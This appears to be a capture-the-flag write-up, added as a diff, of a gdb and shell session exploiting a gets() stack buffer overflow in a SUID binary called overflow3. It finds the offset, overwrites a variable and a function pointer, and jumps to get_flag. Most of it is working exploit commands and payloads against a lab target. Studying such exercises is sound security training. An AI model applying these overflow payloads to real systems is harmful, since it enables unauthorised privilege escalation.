@@ -1,0 +1,92 @@
+# Lets look around
+ls -lart
+
+# Ok, so the flag is root readable, but overflow3 is a SUID binary
+cat overflow3.c
+# gets() will take any length input, buffer overflow
+# all we have to do is change the value of modify_me to be "acsc"
+# since modify-me is delcared before buffer, it will be "above" it on the stack
+# If we overflow buffer, it will run into modify_me and we can control its value 
+
+# How secure is the binary?
+./checksec.sh --file overflow3
+# Not secure at all, awesome
+
+# First step of any buffer overlow is to crash it
+# run with a bunch of A's, see a crash
+python -c "print 'A'*300" > a
+./overflow3 < a 
+Try again
+Segmentation fault (core dumped)
+
+# Use pattern to find the offset of modify_me
+./pattern create 300 > a
+gdb ./overflow3
+disas main
+
+# lets break at the cmp of modify_me
+b *0x080485d0
+r < a
+
+# The asm at this breakpoint is 
+# cmp    eax,0x8048695
+# Lets look at what is being compared
+cmp    eax,0x61637363
+# 0x61637363 is our target value, and we control eax
+
+# That is expected, thats what we see in the c source
+# What is our value that we modified with the pattern?
+info reg
+eax            0x63413163	1665216867
+
+# How far into the pattern is that string?
+q
+./pattern offset 0x63413163
+64
+
+# Ok, we have the offset of modify_me, lets make it "acsc"
+python -c 'print "A"*64 + "acsc"' > a
+
+gdb ./overflow3
+b *0x080485d0
+r < a
+
+# Lets look at modify_me
+info reg
+eax            0x63736361
+ 
+# Hmmm, 0x63736361 != 0x61637363
+# Little endian strikes again!
+
+# Modify our input and try again
+python -c 'print "A"*64 + "csca"' > a
+./overflow3 < a
+function_pointer is still 0
+
+# Lets modify function_pointer!
+python -c 'print "A"*64 + "csca" + "\xef\xbe\xad\xde"' > a
+./overflow3 < a
+Calling function_pointer, jumping to 0xdeadbeef
+Segmentation fault (core dumped)
+
+# So where should be jump to? Let's jump to get_flag()
+cat overflow3.c
+gdb ./overflow3
+disas get_flag
+# First instruction
+# 0x0804856b <+0>:    push   ebp
+
+# Use that instruction as the jump address (little endian)
+python -c 'print "A"*64 + "csca" + "\x6b\x85\x04\x08"' > a
+./overflow3 < a
+Calling function_pointer, jumping to 0x0804856b
+acsc2017{now_you_control_the_flow}
+
+
+
+
+
+
+
+
+
